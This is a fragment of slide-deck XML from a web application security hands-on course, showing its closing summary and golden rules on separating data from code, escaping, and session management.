            <a:ext cx="10561320" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3F4F6"/>
          </a:solidFill>
          <a:ln w="889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4077208"/>
            <a:ext cx="10268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1182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 tools/clean.py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103 / 105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Wrap-up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9322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Web app vulnerabilities often appear where input is interpreted in another context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Cookie, HTML, SQL, shell, and password storage each require different defenses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Observe first, then fix, so you can explain what the mitigation changes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End by summarizing root cause, observed behavior, and mitigation in a table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104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329184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03504" y="6126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Summary and Golden Rules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03504" y="1170432"/>
            <a:ext cx="10927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10561320" cy="2866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1: understand the context.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Where will this data be interpreted: HTML, SQL, or OS shell?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2: preserve the boundary between data and code.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Never treat user input as executable structure.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placeholders, escaping, and safe APIs.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3: compensate for HTTP's stateless nature.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Use strict session management and request verification.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Cleanup: stop the lab environment and run py tools/clean.py.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65653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webapp-security-programming-handson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0881360" y="6565392"/>
            <a:ext cx="685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B87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105 / 105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612648" y="6437376"/>
            <a:ext cx="109270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105</Slides>
  <Notes>105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0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</vt:vector>
  </TitlesOfParts>
  <Company>koide55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webapp-security-programming-handson-2026-en</dc:title>
  <dc:subject>Web Application Security Programming Hands-on</dc:subject>
  <dc:creator>webapp-security-programming-handson</dc:creator>
  <cp:lastModifiedBy>webapp-security-programming-handson</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-24T05:41:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-24T05:41:47Z</dcterms:modified>
</cp:coreProperties>
</file>